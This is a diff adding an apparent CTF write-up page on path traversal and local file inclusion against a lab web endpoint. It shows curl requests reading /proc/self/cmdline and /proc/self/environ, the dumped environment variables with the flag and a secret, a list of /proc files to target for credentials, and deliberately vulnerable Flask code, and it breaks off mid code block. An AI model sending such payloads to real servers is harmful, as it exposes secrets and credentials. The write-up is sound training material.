@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Writeup: Path Traversal via /proc/self/environ — Forge of Jotunheim</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #08090c;
+      --bg2: #0d0e14;
+      --bg3: #12141c;
+      --border: #181a26;
+      --accent: #38bdf8;
+      --accent2: #7dd3fc;
+      --green: #4ade80;
+      --orange: #fb923c;
+      --purple: #a78bfa;
+      --red: #f87171;
+      --yellow: #fbbf24;
+      --teal: #2dd4bf;
+      --text: #e2e8f0;
+      --muted: #4b5563;
+      --code-bg: #060710;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Syne', sans-serif;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 60% 40% at 20% -10%, rgba(56, 189, 248, 0.07) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 35% at 90% 110%, rgba(45, 212, 191, 0.04) 0%, transparent 60%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 0 24px;
+      position: relative;
+      z-index: 1;
+    }
+
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 20px 0;
+      position: sticky;
+      top: 0;
+      background: rgba(8, 9, 12, 0.93);
+      backdrop-filter: blur(12px);
+      z-index: 100;
+    }
+
+    .nav { display: flex; align-items: center; justify-content: space-between; }
+
+    .nav-brand {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .nav-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .hero {
+      padding: 80px 0 60px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .category-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--accent);
+      background: rgba(56, 189, 248, 0.08);
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      padding: 5px 12px;
+      border-radius: 4px;
+      margin-bottom: 28px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .category-tag::before { content: '▶'; font-size: 8px; }
+
+    h1 {
+      font-size: clamp(32px, 5vw, 52px);
+      font-weight: 800;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      margin-bottom: 20px;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: var(--muted);
+      max-width: 600px;
+      line-height: 1.6;
+      margin-bottom: 36px;
+    }
+
+    .meta-row { display: flex; flex-wrap: wrap; gap: 24px; align-items: center; }
+
+    .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .meta-item .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); }
+
+    .difficulty {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--green);
+      background: rgba(74, 222, 128, 0.08);
+      border: 1px solid rgba(74, 222, 128, 0.2);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .tags { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 28px; }
+
+    .tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--teal);
+      background: rgba(45, 212, 191, 0.06);
+      border: 1px solid rgba(45, 212, 191, 0.15);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .content { padding: 60px 0; }
+
+    .tldr {
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 24px 28px;
+      margin-bottom: 48px;
+    }
+
+    .tldr-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .tldr p { font-size: 15px; color: #cbd5e1; line-height: 1.6; }
+
+    .flag-box {
+      background: rgba(74, 222, 128, 0.06);
+      border: 1px solid rgba(74, 222, 128, 0.2);
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin: 32px 0;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .flag-icon { font-size: 28px; flex-shrink: 0; }
+    .flag-label { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 4px; }
+    .flag-value { font-family: 'JetBrains Mono', monospace; font-size: 16px; font-weight: 700; color: var(--green); }
+
+    h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #fff;
+      margin: 56px 0 20px;
+      letter-spacing: -0.01em;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    h2::before {
+      content: attr(data-num);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent);
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+    }
+
+    h3 { font-size: 18px; font-weight: 700; color: #cbd5e1; margin: 32px 0 12px; }
+    p { font-size: 16px; color: #94a3b8; margin-bottom: 16px; line-height: 1.75; }
+    strong { color: #e2e8f0; font-weight: 700; }
+
+    .code-block {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: var(--bg3);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.06em; text-transform: uppercase; }
+    .code-dots { display: flex; gap: 6px; }
+    .code-dots span { width: 10px; height: 10px; border-radius: 50%; }
+    .code-dots span:nth-child(1) { background: #ff5f57; }
+    .code-dots span:nth-child(2) { background: #febc2e; }
+    .code-dots span:nth-child(3) { background: #28c840; }
+
+    pre {
+      padding: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.65;
+    }
+
+    .kw { color: #c792ea; }
+    .str { color: #c3e88d; }
+    .fn { color: #82aaff; }
+    .cm { color: #2a3040; font-style: italic; }
+    .var { color: #f78c6c; }
+    .num { color: #f78c6c; }
+    .hl { color: #fbbf24; font-weight: 700; }
+    .good { color: #4ade80; }
+    .bad { color: #f87171; }
+    .path { color: #38bdf8; }
+    .env-key { color: #f78c6c; }
+    .env-val { color: #c3e88d; }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--accent2);
+      background: rgba(56, 189, 248, 0.08);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+
+    .info-box {
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .info-box p { margin: 0; font-size: 14px; color: #93c5fd; }
+
+    .warning-box {
+      background: rgba(248, 113, 113, 0.06);
+      border: 1px solid rgba(248, 113, 113, 0.15);
+      border-left: 3px solid var(--red);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .warning-box p { margin: 0; font-size: 14px; color: #fca5a5; }
+
+    .success-box {
+      background: rgba(74, 222, 128, 0.06);
+      border: 1px solid rgba(74, 222, 128, 0.15);
+      border-left: 3px solid var(--green);
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .success-box p { margin: 0; font-size: 14px; color: #86efac; }
+
+    .finding {
+      background: linear-gradient(135deg, rgba(56, 189, 248, 0.08), rgba(45, 212, 191, 0.03));
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 24px 0;
+    }
+
+    .finding-label { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--accent); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 8px; }
+    .finding p { margin: 0; font-size: 15px; color: #7dd3fc; }
+
+    /* /proc filesystem visual */
+    .proc-tree {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 24px 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+    }
+
+    .proc-title { font-size: 11px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 16px; }
+
+    .tree-line { display: flex; align-items: flex-start; gap: 0; line-height: 1.8; }
+    .tree-prefix { color: #2a3040; white-space: pre; }
+    .tree-dir { color: var(--accent); }
+    .tree-file { color: #94a3b8; }
+    .tree-file.highlight { color: var(--yellow); font-weight: 700; }
+    .tree-desc { color: #4b5563; font-size: 11px; margin-left: 12px; }
+
+    /* attempt table */
+    .attempt-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+    }
+
+    .attempt-table th {
+      background: var(--bg3);
+      color: var(--accent2);
+      padding: 10px 14px;
+      text-align: left;
+      border: 1px solid var(--border);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .attempt-table td {
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      color: #94a3b8;
+      background: var(--bg2);
+      vertical-align: top;
+    }
+
+    .attempt-table tr:hover td { background: var(--bg3); }
+
+    .badge-500 { color: var(--orange); background: rgba(251,146,60,0.08); border: 1px solid rgba(251,146,60,0.2); padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+    .badge-200 { color: var(--green); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+    .badge-404 { color: var(--red); background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+
+    /* attack flow */
+    .attack-flow {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 32px;
+      margin: 32px 0;
+    }
+
+    .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 24px; }
+    .flow-steps { display: flex; flex-direction: column; gap: 0; }
+
+    .flow-step { display: flex; align-items: flex-start; gap: 16px; position: relative; }
+
+    .flow-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 18px;
+      top: 36px;
+      width: 1px;
+      height: calc(100% - 12px);
+      background: var(--border);
+    }
+
+    .flow-num {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+    }
+
+    .flow-content { padding: 6px 0 28px; }
+    .flow-label { font-size: 15px; font-weight: 700; color: #e2e8f0; margin-bottom: 4px; }
+    .flow-desc { font-size: 13px; color: var(--muted); font-family: 'JetBrains Mono', monospace; }
+
+    /* proc files grid */
+    .proc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 14px;
+      margin: 24px 0;
+    }
+
+    .proc-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px;
+      transition: border-color 0.2s;
+    }
+
+    .proc-card:hover { border-color: rgba(56, 189, 248, 0.3); }
+    .proc-card.highlight-card { border-color: rgba(56, 189, 248, 0.4); background: rgba(56, 189, 248, 0.03); }
+
+    .proc-path { font-family: 'JetBrains Mono', monospace; font-size: 13px; font-weight: 700; color: var(--accent); margin-bottom: 6px; }
+    .proc-path.used { color: var(--yellow); }
+    .proc-desc { font-size: 13px; color: var(--muted); line-height: 1.5; }
+    .proc-badge { display: inline-block; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--yellow); background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.2); padding: 2px 6px; border-radius: 4px; margin-top: 8px; }
+
+    .divider { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+
+    footer { border-top: 1px solid var(--border); padding: 40px 0; margin-top: 40px; }
+    .footer-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+    .footer-text { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--muted); }
+    .footer-badge { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--green); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 4px 12px; border-radius: 4px; }
+
+    @media (max-width: 600px) {
+      .meta-row { flex-direction: column; gap: 12px; }
+      h2 { font-size: 22px; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <nav class="nav">
+      <span class="nav-brand">RedFox CTF</span>
+      <span class="nav-tag">writeup / web / path-traversal</span>
+    </nav>
+  </div>
+</header>
+
+<div class="container">
+
+  <section class="hero">
+    <div class="category-tag">Web Security · Path Traversal · LFI</div>
+    <h1>Forge of Jotunheim:<br>LFI via /proc/self/environ</h1>
+    <p class="subtitle">A file read endpoint with no path sanitization, a 500 error that confirmed traversal was working, and a Linux pseudo-filesystem that exposed the flag hidden in environment variables.</p>
+
+    <div class="meta-row">
+      <div class="meta-item"><span class="dot"></span><span>RedFox CTF 2026</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Category: Web / LFI</span></div>
+      <div class="meta-item"><span class="dot"></span><span>Challenge: Forge of Jotunheim</span></div>
+      <div class="difficulty">EASY</div>
+    </div>
+
+    <div class="tags">
+      <span class="tag">path-traversal</span>
+      <span class="tag">lfi</span>
+      <span class="tag">proc-filesystem</span>
+      <span class="tag">environ</span>
+      <span class="tag">directory-traversal</span>
+      <span class="tag">wsgi</span>
+      <span class="tag">python</span>
+    </div>
+  </section>
+
+  <article class="content">
+
+    <div class="tldr">
+      <div class="tldr-label">TL;DR</div>
+      <p>The challenge exposed a <code>/etching?plate=</code> endpoint that read files by filename. By substituting an absolute path to <code>/proc/self/environ</code> — a Linux pseudo-file that exposes the running process's environment variables — we retrieved the flag that was stored as an environment variable in the Python WSGI server process.</p>
+    </div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag</div>
+        <div class="flag-value">REDFOX{jotunheim_forge_test}</div>
+      </div>
+    </div>
+
+    <!-- Challenge Description -->
+    <h2 data-num="01">Challenge Description</h2>
+    <p>The challenge lore read:</p>
+    <div class="info-box">
+      <p><em>"The giants of Jotunheim preserve their etchings within the forge, each plate cataloged for those allowed to inspect them. Yet the forge is old, and old paths often hide cracks where careful hands may slip through. One note, meant for no outsider, remains etched beyond its rightful place. Find the hidden inscription and claim the flag."</em></p>
+    </div>
+
+    <p>Visiting <code>http://lab.redfoxsec.com:8404/</code> revealed a listing of "etchings" — catalog entries. The page linked to entries like <code>/etching?plate=1</code>, suggesting a file-based read system where the <code>plate</code> parameter controlled which file was served.</p>
+
+    <!-- Step 1 -->
+    <h2 data-num="02">Step 1 — Discovering the Vulnerable Endpoint</h2>
+    <p>We ran gobuster to enumerate endpoints, but the server returned 200 for all paths (wildcard responses). We fixed this by excluding the default response length:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cm"># First run — wildcard responses block gobuster</span>
+gobuster dir -u http://lab.redfoxsec.com:8404/ \
+  -w /usr/share/wordlists/dirb/common.txt
+<span class="cm"># Error: server returns 200 for non-existing URLs (length: 1476)</span>
+
+<span class="cm"># Fix: exclude that response length</span>
+gobuster dir -u http://lab.redfoxsec.com:8404/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  --exclude-length 1476</pre>
+    </div>
+
+    <p><strong>Gobuster output:</strong></p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">output</span>
+      </div>
+      <pre>/health               (Status: 200) [Size: 2]
+<span class="cm"># Only /health was real — plus the main page with /etching?plate=</span></pre>
+    </div>
+
+    <p>The main page exposed the endpoint: <code>/etching?plate=&lt;filename&gt;</code>. Combined with the response headers revealing <code>Server: WSGIServer/0.2 CPython/3.11.15</code>, we knew this was a Python application serving files based on user input.</p>
+
+    <!-- Step 2 -->
+    <h2 data-num="03">Step 2 — Testing Path Traversal</h2>
+    <p>We tried classic path traversal with relative paths first:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash — attempts</span>
+      </div>
+      <pre><span class="cm"># Classic relative traversal</span>
+curl "http://lab.redfoxsec.com:8404/etching?plate=../flag.txt"
+curl "http://lab.redfoxsec.com:8404/etching?plate=../../flag.txt"
+
+<span class="cm"># Null byte (Python 3 is immune to this)</span>
+curl "http://lab.redfoxsec.com:8404/etching?plate=../flag.txt%00"
+
+<span class="cm"># URL encoded</span>
+curl "http://lab.redfoxsec.com:8404/etching?plate=..%2Fflag.txt"</pre>
+    </div>
+
+    <p>All returned <strong>HTTP 500</strong> — not a 403 or "access denied". This was actually a positive sign:</p>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Key Insight</div>
+      <p>A <strong>500 error means the traversal reached the file system</strong> but couldn't find the file — not that it was blocked. A 403 would mean the server detected and blocked traversal. 500 means we have access to the filesystem, we just need the right path.</p>
+    </div>
+
+    <!-- Step 3 -->
+    <h2 data-num="04">Step 3 — Enumerating with /proc</h2>
+    <p>Since relative paths couldn't locate <code>flag.txt</code>, we switched strategy. Linux's <code>/proc</code> pseudo-filesystem exposes process information as readable files — and crucially, we can access it with <strong>absolute paths</strong>.</p>
+
+    <h3>The /proc Filesystem</h3>
+    <p>On every Linux system, <code>/proc/self/</code> is a special directory that always points to the currently running process. It contains files that expose the process's internals:</p>
+
+    <div class="proc-tree">
+      <div class="proc-title">// /proc/self — process information</div>
+      <div class="tree-line"><span class="tree-prefix">/proc/self/</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file highlight">environ</span><span class="tree-desc">← environment variables (FLAG is here!)</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file">cmdline</span><span class="tree-desc">← command that started the process</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file">cwd</span><span class="tree-desc">← symlink to current working directory</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file">exe</span><span class="tree-desc">← symlink to the executable binary</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file">maps</span><span class="tree-desc">← memory map of the process</span></div>
+      <div class="tree-line"><span class="tree-prefix">├── </span><span class="tree-file">status</span><span class="tree-desc">← process status (PID, state, etc)</span></div>
+      <div class="tree-line"><span class="tree-prefix">└── </span><span class="tree-file">fd/</span><span class="tree-desc">← open file descriptors</span></div>
+    </div>
+
+    <p>We first used <code>/proc/self/cmdline</code> to confirm traversal worked and identify the working directory:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre>curl "http://lab.redfoxsec.com:8404/etching?plate=/proc/self/cmdline"</pre>
+    </div>
+
+    <div class="success-box">
+      <p>This returned the command used to start the Python server, confirming absolute path traversal worked!</p>
+    </div>
+
+    <!-- Step 4 -->
+    <h2 data-num="05">Step 4 — Reading /proc/self/environ</h2>
+    <p>With absolute path traversal confirmed, we hit the jackpot target — <code>/proc/self/environ</code>. This file contains all environment variables for the running process, including any secrets or flags set at startup.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cm"># environ contains binary data (null-separated) — force output</span>
+curl --output - "http://lab.redfoxsec.com:8404/etching?plate=/proc/self/environ"</pre>
+    </div>
+
+    <p>curl warned us about binary output — we used <code>--output -</code> to force it to print anyway. The response contained all environment variables of the Python WSGI process, null-byte separated:</p>
+
+<div class="code-block">
+  <div class="code-header">
+    <div class="code-dots"><span></span><span></span><span></span></div>
+    <span class="code-lang">output — /proc/self/environ (parsed)</span>
+  </div>
+  <pre><span class="env-key">PATH</span>=<span class="env-val">/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+<span class="env-key">HOSTNAME</span>=<span class="env-val">3d5d5bcec4f5</span>
+<span class="env-key">APP_PORT</span>=<span class="env-val">8404</span>
+<span class="env-key">APP_SECRET</span>=<span class="env-val">jotunheim-etch-key</span>
+<span class="env-key">FLAG</span>=<span class="hl">REDFOX{jotunheim_forge_test}</span>   <span class="cm">← the flag!</span>
+<span class="env-key">LANG</span>=<span class="env-val">C.UTF-8</span>
+<span class="env-key">PYTHON_VERSION</span>=<span class="env-val">3.11.15</span>
+<span class="env-key">PYTHON_SHA256</span>=<span class="env-val">272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625</span>
+<span class="env-key">PYTHONDONTWRITEBYTECODE</span>=<span class="env-val">1</span>
+<span class="env-key">HOME</span>=<span class="env-val">/root</span></pre>
+</div>
+
+    <div class="flag-box">
+      <div class="flag-icon">🚩</div>
+      <div>
+        <div class="flag-label">Flag Captured!</div>
+        <div class="flag-value">REDFOX{jotunheim_forge_test}</div>
+      </div>
+    </div>
+
+    <!-- Attempt Summary -->
+    <h2 data-num="06">Attempt Summary</h2>
+    <p>Here's a full log of every payload we tried and what each response told us:</p>
+
+    <table class="attempt-table">
+      <thead>
+        <tr>
+          <th>Payload</th>
+          <th>Response</th>
+          <th>What it told us</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>../flag.txt%00</code></td>
+          <td><span class="badge-500">500</span></td>
+          <td>Null byte trick fails on Python 3. But 500 ≠ blocked.</td>
+        </tr>
+        <tr>
+          <td><code>../flag.txt</code></td>
+          <td><span class="badge-500">500</span></td>
+          <td>Traversal works, file not found at this relative path.</td>
+        </tr>
+        <tr>
+          <td><code>../../flag.txt</code></td>
+          <td><span class="badge-500">500</span></td>
+          <td>Still can't find flag.txt — unknown working directory.</td>
+        </tr>
+        <tr>
+          <td><code>/proc/self/cmdline</code></td>
+          <td><span class="badge-200">200</span></td>
+          <td>Absolute paths work! Server working directory revealed.</td>
+        </tr>
+        <tr>
+          <td><code>/proc/self/environ</code></td>
+          <td><span class="badge-200">200</span></td>
+          <td>Environment variables dumped — FLAG= variable found!</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <!-- Attack Flow -->
+    <h2 data-num="07">Full Attack Flow</h2>
+
+    <div class="attack-flow">
+      <div class="flow-title">// complete attack chain</div>
+      <div class="flow-steps">
+
+        <div class="flow-step">
+          <div class="flow-num">1</div>
+          <div class="flow-content">
+            <div class="flow-label">Discover the Endpoint</div>
+            <div class="flow-desc">Gobuster + --exclude-length → /etching?plate= found</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">2</div>
+          <div class="flow-content">
+            <div class="flow-label">Confirm Path Traversal</div>
+            <div class="flow-desc">plate=../flag.txt → 500 (not 403) → traversal reaches filesystem</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">3</div>
+          <div class="flow-content">
+            <div class="flow-label">Identify Python/WSGI Stack</div>
+            <div class="flow-desc">Server: WSGIServer/0.2 CPython/3.11.15 → /proc filesystem available</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">4</div>
+          <div class="flow-content">
+            <div class="flow-label">Test Absolute Path Access</div>
+            <div class="flow-desc">plate=/proc/self/cmdline → 200, process info returned</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">5</div>
+          <div class="flow-content">
+            <div class="flow-label">Read /proc/self/environ</div>
+            <div class="flow-desc">curl --output - → environment variables dumped</div>
+          </div>
+        </div>
+
+        <div class="flow-step">
+          <div class="flow-num">6</div>
+          <div class="flow-content">
+            <div class="flow-label">Flag Captured</div>
+            <div class="flow-desc">FLAG=REDFOX{jotunheim_forge_test} found in environ</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- /proc files reference -->
+    <h2 data-num="08">Useful /proc Files in LFI Attacks</h2>
+    <p>When you have Local File Inclusion on a Linux system, <code>/proc/self/</code> is often more useful than trying to guess file paths. Here are the most valuable targets:</p>
+
+    <div class="proc-grid">
+
+      <div class="proc-card highlight-card">
+        <div class="proc-path used">/proc/self/environ</div>
+        <div class="proc-desc">Environment variables of the process. Often contains secrets, flags, API keys, database credentials, and configuration values set at container startup.</div>
+        <div class="proc-badge">USED IN THIS CHALLENGE</div>
+      </div>
+
+      <div class="proc-card">
+        <div class="proc-path">/proc/self/cmdline</div>
+        <div class="proc-desc">The command used to start the process. Reveals the working directory, script path, and interpreter. Useful for finding where config files live.</div>
+      </div>
+
+      <div class="proc-card">
+        <div class="proc-path">/proc/self/cwd</div>
+        <div class="proc-desc">Symlink to the current working directory. Once you know the CWD, relative paths become absolute — find config.py, app.py, .env files etc.</div>
+      </div>
+
+      <div class="proc-card">
+        <div class="proc-path">/proc/self/exe</div>
+        <div class="proc-desc">Symlink to the executable binary. Reading it returns the Python interpreter binary — less useful for flags but confirms the runtime.</div>
+      </div>
+
+      <div class="proc-card">
+        <div class="proc-path">/proc/self/fd/</div>
+        <div class="proc-desc">Open file descriptors. fd/0 = stdin, fd/1 = stdout, fd/2 = stderr. Higher numbers may point to open log files or config files.</div>
+      </div>
+
+      <div class="proc-card">
+        <div class="proc-path">/proc/self/maps</div>
+        <div class="proc-desc">Memory map of the process. Shows all loaded libraries and their paths — useful for finding exact file locations on the system.</div>
+      </div>
+
+    </div>
+
+    <hr class="divider">
+
+    <!-- How it works technically -->
+    <h2 data-num="09">Why This Works — Vulnerable Server Code</h2>
+    <p>The vulnerability exists because the server passes the <code>plate</code> parameter directly to a file-open call without any validation:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — vulnerable server code (conceptual)</span>
+      </div>
+      <pre><span class="kw">from</span> flask <span class="kw">import</span> Flask, request, Response
+<span class="kw">import</span> os
+
+app = Flask(__name__)
+ETCHINGS_DIR = <span class="str">"/app/etchings/"</span>
+
+<span class="kw">@app</span>.route(<span class="str">'/etching'</span>)
+<span class="kw">def</span> <span class="fn">etching</span>():
+    plate = request.args.get(<span class="str">'plate'</span>)  <span class="cm"># user-controlled</span>
+
+    <span class="cm"># ❌ VULNERABLE: no path sanitization</span>
+    file_path = os.path.join(ETCHINGS_DIR, plate)
+
+    <span class="cm"># When plate = "/proc/self/environ":</span>
+    <span class="cm"># os.path.join("/app/etchings/", "/proc/self/environ")</span>
+    <span class="cm"># = "/proc/self/environ"  ← absolute path wins!</span>
+
+    <span class="kw">with</span> <span class="fn">open</span>(file_path, <span class="str">'rb'</span>) <span class="kw">as</span> f:
+        <span class="kw">return</span> Response(f.read(), mimetype=<span class="str">'text/plain'</span>)</pre>
+    </div>
+
+    <div class="finding">
+      <div class="finding-label">⚡ Python os.path.join Gotcha</div>
+      <p>In Python, <code>os.path.join(base, "/absolute/path")</code> <strong>discards the base entirely</strong> and returns just the absolute path. This is the exact behavior that makes absolute path injection work even when the developer thought they were safely joining paths.</p>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">python — os.path.join behavior</span>
+      </div>
+      <pre><span class="kw">import</span> os
+
+<span class="cm"># Normal usage</span>
+os.path.join(<span class="str">"/app/etchings"</span>, <span class="str">"plate1.txt"</span>)
+<span class="cm"># → "/app/etchings/plate1.txt"  ✓ safe</span>
+
+<span class="cm"># Absolute path injection — base is DISCARDED</span>
+os.path.join(<span class="str">"/app/etchings"</span>, <span class="str">"/proc/self/environ"</span>)
+<span class="cm"># → "/proc/self/environ"  ← base gone, attacker wins!</span>
+
+<span class="cm"># Relative traversal also works</span>
